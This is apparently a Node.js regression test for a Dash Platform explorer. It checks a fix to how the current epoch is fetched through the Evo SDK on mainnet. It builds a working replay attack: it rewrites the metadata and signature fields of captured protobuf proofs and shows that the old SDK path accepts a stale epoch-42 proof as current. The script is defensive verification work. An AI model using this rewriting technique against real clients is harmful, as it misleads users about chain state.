#!/usr/bin/env node
// Read-only, network-dependent regression using the actual public SDK and helper.
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdir, mkdtemp, readFile, writeFile } from 'node:fs/promises';
import { stripTypeScriptTypes } from 'node:module';
import { tmpdir } from 'node:os';
import { resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

const root = fileURLToPath(new URL('../', import.meta.url));
const output = process.env.NPE_EPOCH_REPLAY_OUTPUT
  ? resolve(process.env.NPE_EPOCH_REPLAY_OUTPUT)
  : await mkdtemp(resolve(tmpdir(), 'npe-current-epoch-replay-'));
assert(!output.startsWith(root), 'Save raw evidence outside the product worktree.');
await mkdir(output, { recursive: true });
const hash = (bytes) => createHash('sha256').update(bytes).digest('hex');
const json = (value) => JSON.stringify(value, (_, item) => typeof item === 'bigint'
  ? item.toString() : item instanceof Map ? Object.fromEntries(item) : item, 2);
const records = [];
async function record(value) {
  records.push(value);
  console.log(json(value));
  await writeFile(resolve(output, 'results.json'), `${json(records)}\n`);
}

// Only this narrow protobuf framing code is local; cryptographic verification
// and all returned SDK values remain the real package's implementation.
function varint(bytes, offset) {
  let value = 0n;
  for (let shift = 0n; offset < bytes.length && shift <= 63n; shift += 7n) {
    const byte = bytes[offset++];
    value |= BigInt(byte & 127) << shift;
    if (!(byte & 128)) return { value, end: offset };
  }
  throw new Error('Truncated or oversized protobuf varint.');
}
function encodeVarint(value) {
  let remaining = BigInt(value);
  assert(remaining >= 0n);
  const bytes = [];
  do {
    bytes.push(Number(remaining & 127n) | (remaining > 127n ? 128 : 0));
    remaining >>= 7n;
  } while (remaining);
  return Buffer.from(bytes);
}
function fields(bytes) {
  const found = new Map();
  for (let offset = 0; offset < bytes.length;) {
    const start = offset;
    const key = varint(bytes, offset);
    offset = key.end;
    const number = Number(key.value >> 3n);
    const wire = Number(key.value & 7n);
    assert(number > 0 && !found.has(number), 'Unexpected duplicate/zero protobuf field.');
    let value;
    if (wire === 0) {
      const item = varint(bytes, offset);
      value = item.value;
      offset = item.end;
    } else if (wire === 2) {
      const length = varint(bytes, offset);
      assert(length.value <= BigInt(bytes.length));
      offset = length.end;
      value = bytes.subarray(offset, offset + Number(length.value));
      offset += Number(length.value);
    } else if (wire === 1) offset += 8;
    else if (wire === 5) offset += 4;
    else throw new Error(`Unsupported protobuf wire type ${wire}.`);
    assert(offset <= bytes.length, 'Truncated protobuf field.');
    found.set(number, { wire, value, start, end: offset, raw: bytes.subarray(start, offset) });
  }
  return found;
}
function field(bytes, number) {
  const item = fields(bytes).get(number);
  assert(item, `Missing protobuf field ${number}.`);
  return item.value;
}
function replace(bytes, number, value) {
  const item = fields(bytes).get(number);
  assert(item && (item.wire === 0 || item.wire === 2));
  const encoded = item.wire === 0 ? encodeVarint(value)
    : Buffer.concat([encodeVarint(value.length), value]);
  return Buffer.concat([bytes.subarray(0, item.start), encodeVarint((number << 3) | item.wire),
    encoded, bytes.subarray(item.end)]);
}
function frame(bytes) {
  assert(bytes.length >= 5 && bytes[0] === 0, 'Expected an uncompressed gRPC data frame.');
  const size = bytes.readUInt32BE(1);
  assert(size + 5 <= bytes.length, 'Truncated gRPC frame.');
  return { message: bytes.subarray(5, 5 + size), trailers: bytes.subarray(5 + size) };
}
function response(bytes) {
  const parsed = frame(bytes);
  const version = field(parsed.message, 1);
  const proof = field(version, 2);
  const metadata = field(version, 3);
  const signature = field(proof, 3);
  assert.equal(signature.length, 96, 'Expected the actual BLS signature.');
  assert(signature.some((byte) => byte !== 0));
  return { ...parsed, version, proof, metadata, signature,
    epoch: Number(fields(metadata).get(3)?.value ?? 0n), timeMs: field(metadata, 4) };
}
function requestQuery(bytes) {
  const parsed = frame(bytes);
  assert.equal(parsed.trailers.length, 0, 'Unexpected request trailers.');
  const version = fields(field(parsed.message, 1));
  const start = version.get(1);
  return { startEpoch: start ? Number(fields(start.value).get(1)?.value ?? 0n) : null,
    count: Number(version.get(2)?.value ?? 0n), ascending: version.get(3)?.value === 1n,
    prove: version.get(4)?.value === 1n };
}
function sameExcept(before, after, excluded) {
  const select = (bytes) => [...fields(bytes)]
    .filter(([number]) => !excluded.includes(number)).map(([number, item]) => [number, item.raw]);
  assert.deepEqual(select(before), select(after), 'Unexpected changes outside the target fields.');
}
function rewrite(bytes, { epoch, timeMs, corruptSignature = false } = {}) {
  const before = response(bytes);
  let metadata = before.metadata;
  if (epoch !== undefined) metadata = replace(metadata, 3, epoch);
  if (timeMs !== undefined) metadata = replace(metadata, 4, timeMs);
  let proof = before.proof;
  if (corruptSignature) {
    const signature = Buffer.from(before.signature);
    signature[signature.length - 1] ^= 1;
    proof = replace(proof, 3, signature);
  }
  let version = replace(before.version, 3, metadata);
  if (corruptSignature) version = replace(version, 2, proof);
  const message = replace(before.message, 1, version);
  const header = Buffer.alloc(5);
  header.writeUInt32BE(message.length, 1);
  const changed = Buffer.concat([header, message, before.trailers]);
  const after = response(changed);
  assert.deepEqual(after.trailers, before.trailers);
  sameExcept(before.message, after.message, [1]);
  sameExcept(before.version, after.version, [2, 3]);
  sameExcept(before.metadata, after.metadata,
    [epoch === undefined ? -1 : 3, timeMs === undefined ? -1 : 4]);
  if (corruptSignature) sameExcept(before.proof, after.proof, [3]);
  else assert.deepEqual(after.proof, before.proof, 'The whole proof and signature must remain identical.');
  if (epoch !== undefined) assert.equal(after.epoch, epoch);
  if (timeMs !== undefined) assert.equal(after.timeMs, timeMs);
  return changed;
}
function evidence(bytes) {
  const decoded = response(bytes);
  return { bodySha256: hash(bytes), wholeProofSha256: hash(decoded.proof),
    grovedbProofSha256: hash(field(decoded.proof, 1)), signatureSha256: hash(decoded.signature),
    signatureBytes: decoded.signature.length, metadataEpoch: decoded.epoch,
    signedTimeMs: decoded.timeMs, metadataHeight: field(decoded.metadata, 1) };
}

const dataUrl = (source) => `data:text/javascript;base64,${Buffer.from(source).toString('base64')}`;
const queriesSource = await readFile(resolve(root, 'src/sdk/epoch-queries.ts'), 'utf8');
const helperSource = await readFile(resolve(root, 'src/sdk/current-epoch.ts'), 'utf8');
const queriesUrl = dataUrl(stripTypeScriptTypes(queriesSource, { mode: 'strip' }));
const helperJs = stripTypeScriptTypes(helperSource, { mode: 'strip' });
const runtimeImport = /\bfrom\s+(['"])\.\/epoch-queries\1/g;
assert.equal([...helperJs.matchAll(runtimeImport)].length, 1, 'Review changed helper imports before running.');
const { fetchCurrentEpoch, epochDurationMs } = await import(dataUrl(
  helperJs.replace(runtimeImport, `from '${queriesUrl}'`)));
const durationMs = epochDurationMs('mainnet');
assert.equal(durationMs, 788_400_000n);
const sdkUrl = import.meta.resolve('@dashevo/evo-sdk');
const sdkPackage = JSON.parse(await readFile(new URL('../package.json', sdkUrl), 'utf8'));
assert.equal(sdkPackage.version, '4.0.0-rc.2', 'This regression targets the pinned SDK.');
await record({ kind: 'runtime', output, node: process.version, sdkPublicExport: sdkUrl,
  sdkPackageVersion: sdkPackage.version, network: 'mainnet', trusted: true, retries: 0,
  helperSourceSha256: hash(helperSource), epochQueriesSourceSha256: hash(queriesSource),
  supportedDurationMs: durationMs, readOnly: true });

const realFetch = globalThis.fetch;
const transports = [];
let mode = 'connect';
let replayBodies = [];
let replayOffset = 0;
globalThis.fetch = async (input, init) => {
  const request = input instanceof Request ? input : new Request(input, init);
  const url = new URL(request.url);
  const isEpoch = request.method === 'POST' && url.pathname.endsWith('/getEpochsInfo');
  if (!isEpoch) {
    assert(['GET', 'HEAD'].includes(request.method), `Unexpected non-read transport: ${request.method} ${url.pathname}`);
    return realFetch(input, init); // Actual trusted quorum/context lookup, never mocked.
  }
  const requestBytes = Buffer.from(await request.clone().arrayBuffer());
  const query = requestQuery(requestBytes);
  const id = transports.length + 1;
  let body;
  let result;
  if (mode.startsWith('replay-')) {
    assert(replayOffset < replayBodies.length, 'Unexpected retry/fallback transport.');
    body = replayBodies[replayOffset++];
    result = new Response(body, { status: 200,
      headers: { 'content-type': 'application/grpc-web+proto', 'grpc-status': '0' } });
  } else {
    result = await realFetch(input, init);
    assert.equal(result.status, 200, 'Live epoch transport failed.');
    body = Buffer.from(await result.clone().arrayBuffer());
  }
  const filename = `${String(id).padStart(2, '0')}-${mode}.bin`;
  await writeFile(resolve(output, filename), body);
  const entry = { kind: 'transport', id, mode, query, requestHex: requestBytes.toString('hex'),
    responseFile: filename, ...evidence(body) };
  transports.push({ ...entry, body });
  await record(entry);
  return result;
};

async function probe(label, nextMode, fn, bodies = []) {
  mode = nextMode;
  replayBodies = bodies;
  replayOffset = 0;
  const before = transports.length;
  try {
    const value = await fn();
    await record({ kind: 'accepted', label, transportCalls: transports.length - before, result: value });
    return { accepted: true, value, calls: transports.slice(before) };
  } catch (error) {
    await record({ kind: 'rejected', label, transportCalls: transports.length - before,
      error: { name: error.name, kind: error.kind, message: error.message ?? String(error) } });
    return { accepted: false, error, calls: transports.slice(before) };
  }
}
const explicit = (startEpoch, ascending = true) => ({ startEpoch, count: 1, ascending });
const expectQuery = (call, startEpoch, ascending = true) => assert.deepEqual(call.query,
  { startEpoch, count: 1, ascending, prove: true });
function accepted(probeResult, calls) {
  assert(probeResult.accepted, probeResult.error?.message);
  assert.equal(probeResult.calls.length, calls, 'Unexpected retry/cache/fallback.');
  return probeResult.value;
}
function rejected(probeResult, calls, message) {
  assert(!probeResult.accepted, 'The attack/negative control was unexpectedly accepted.');
  assert.equal(probeResult.calls.length, calls, 'Unexpected retry/cache/fallback.');
  assert.equal(probeResult.error.kind, 4, 'Expected a native proof rejection.');
  assert.match(probeResult.error.message, message);
}

try {
  const { EvoSDK } = await import('@dashevo/evo-sdk'); // Public export, including its actual embedded WASM.
  const sdk = EvoSDK.mainnetTrusted({ settings: { timeoutMs: 10_000, retries: 0,
    connectTimeoutMs: 5_000 }, logs: 'off' });
  await sdk.connect();
  await record({ kind: 'connected', trustedQuorumSource: 'quorums.mainnet.networks.dash.org',
    protocolVersionSelectedBySdk: sdk.version() });

  const genesisProbe = await probe('live explicit epoch zero', 'capture-genesis',
    () => sdk.epoch.epochsInfoWithProof(explicit(0)));
  const genesis = accepted(genesisProbe, 1).data.get(0);
  assert.equal(genesis.index, 0);
  expectQuery(genesisProbe.calls[0], 0);
  const genesisBody = genesisProbe.calls[0].body;
  const genesisTimeMs = BigInt(genesis.firstBlockTime);
  const derive = (bytes) => Number((response(bytes).timeMs - genesisTimeMs) / durationMs);

  // Descending is intentional: the vulnerable implicit-current verifier uses
  // an upper bound, so this is the historical proof accepted by that path.
  const historicalProbe = await probe('live explicit historical epoch42', 'capture-historical42',
    () => sdk.epoch.epochsInfoWithProof(explicit(42, false)));
  const historical = accepted(historicalProbe, 1);
  assert.equal(historical.data.get(42).index, 42);
  expectQuery(historicalProbe.calls[0], 42, false);
  const historicalBody = historicalProbe.calls[0].body;
  const currentAtHistoricalRoot = derive(historicalBody);
  assert(currentAtHistoricalRoot > 42, 'Epoch42 must be historical for this regression.');
  const metadata42 = rewrite(historicalBody, { epoch: 42 });
  const genesisMetadata42 = rewrite(genesisBody, { epoch: 42 });

  const liveCurrentProbe = await probe('live implicit current control', 'live-implicit-current',
    () => sdk.epoch.currentWithProof());
  const liveCurrent = accepted(liveCurrentProbe, 1);
  expectQuery(liveCurrentProbe.calls[0], null, false);
  assert.equal(liveCurrent.data.index, derive(liveCurrentProbe.calls[0].body));

  const historicalReplay = await probe('unmodified historical replay control', 'replay-historical-control',
    () => sdk.epoch.epochsInfoWithProof(explicit(42, false)), [historicalBody]);
  assert.deepEqual(JSON.parse(json(accepted(historicalReplay, 1).data)), JSON.parse(json(historical.data)));
  expectQuery(historicalReplay.calls[0], 42, false);

  const oldUnmodified = await probe('old implicit unmodified historical rejection', 'replay-old-unmodified',
    () => sdk.epoch.currentWithProof(), [historicalBody]);
  rejected(oldUnmodified, 1, /upper bound/i);
  expectQuery(oldUnmodified.calls[0], null, false);

  const oldAttack = await probe('old implicit metadata-only epoch42 accepted', 'replay-old-metadata42',
    () => sdk.epoch.currentWithProof(), [metadata42]);
  const wronglyCurrent = accepted(oldAttack, 1);
  assert.equal(wronglyCurrent.data.index, 42);
  assert.equal(wronglyCurrent.metadata.epoch, 42);
  assert.deepEqual(JSON.parse(json(wronglyCurrent.data)), JSON.parse(json(historical.data.get(42))));
  assert.deepEqual(wronglyCurrent.proof.grovedbProof, historical.proof.grovedbProof);
  expectQuery(oldAttack.calls[0], null, false);

  const execution = { assertActive() {} }; // No cancellation; does not alter SDK results or verification.
  const fixedLive = await probe('actual helper live signed-time current', 'live-helper',
    () => fetchCurrentEpoch(sdk, 'mainnet', true, execution));
  assert(fixedLive.accepted, fixedLive.error?.message);
  assert(fixedLive.calls.length >= 2 && fixedLive.calls.length <= 4);
  expectQuery(fixedLive.calls[0], 0);
  for (let i = 1; i < fixedLive.calls.length; i++) {
    expectQuery(fixedLive.calls[i], derive(fixedLive.calls[i - 1].body));
  }
  assert.equal(fixedLive.value.index, derive(fixedLive.calls.at(-1).body));

  const fixedAttack = await probe('actual helper rejects historical metadata42', 'replay-fixed-metadata42',
    () => fetchCurrentEpoch(sdk, 'mainnet', true, execution), [genesisMetadata42, metadata42]);
  rejected(fixedAttack, 2, /missing data for query|lower bound/i);
  expectQuery(fixedAttack.calls[0], 0);
  expectQuery(fixedAttack.calls[1], derive(genesisBody));
  assert(derive(genesisBody) > 42);

  const badSignature = rewrite(genesisBody, { corruptSignature: true });
  const signatureControl = await probe('actual helper rejects corrupted signature', 'replay-bad-signature',
    () => fetchCurrentEpoch(sdk, 'mainnet', true, execution), [badSignature]);
  rejected(signatureControl, 1, /signature/i);
  expectQuery(signatureControl.calls[0], 0);

  const changedSignedTime = rewrite(genesisBody, { timeMs: response(genesisBody).timeMs + 1n });
  const timeControl = await probe('actual helper rejects signed time mutation', 'replay-bad-signed-time',
    () => fetchCurrentEpoch(sdk, 'mainnet', true, execution), [changedSignedTime]);
  rejected(timeControl, 1, /signature/i);
  expectQuery(timeControl.calls[0], 0);

  const unsupported = await probe('actual helper unknown devnet fails before transport', 'replay-unsupported-devnet',
    () => fetchCurrentEpoch(sdk, 'devnet-custom', true, execution));
  assert(!unsupported.accepted && unsupported.calls.length === 0);
  assert.match(unsupported.error.message, /no verified epoch duration/i);

  const summary = { passed: true, verdict: 'CONFIRMED', severity: 'Low explorer data integrity',
    sdkPackageVersion: sdkPackage.version, helperSourceSha256: hash(helperSource),
    actualHelperEpoch: fixedLive.value.index, currentAtHistoricalSignedRoot: currentAtHistoricalRoot,
    incorrectlyAcceptedOldImplicitEpoch: wronglyCurrent.data.index, genesisTimeMs,
    historicalOriginal: evidence(historicalBody), historicalMetadata42: evidence(metadata42),
    genesisOriginal: evidence(genesisBody), genesisMetadata42: evidence(genesisMetadata42),
    claim: 'Current at authenticated response time; not a general newest-signed-root guarantee.',
    probes: records.filter((item) => ['accepted', 'rejected'].includes(item.kind))
      .map(({ label, kind, transportCalls }) => ({ label, outcome: kind, transportCalls })) };
  await writeFile(resolve(output, 'verification.json'), `${json(summary)}\n`);
  await record({ kind: 'verified', ...summary });
} catch (error) {
  await record({ kind: 'failed', error: { name: error.name, message: error.message ?? String(error) } });
  process.exitCode = 1;
} finally {
  globalThis.fetch = realFetch;
}
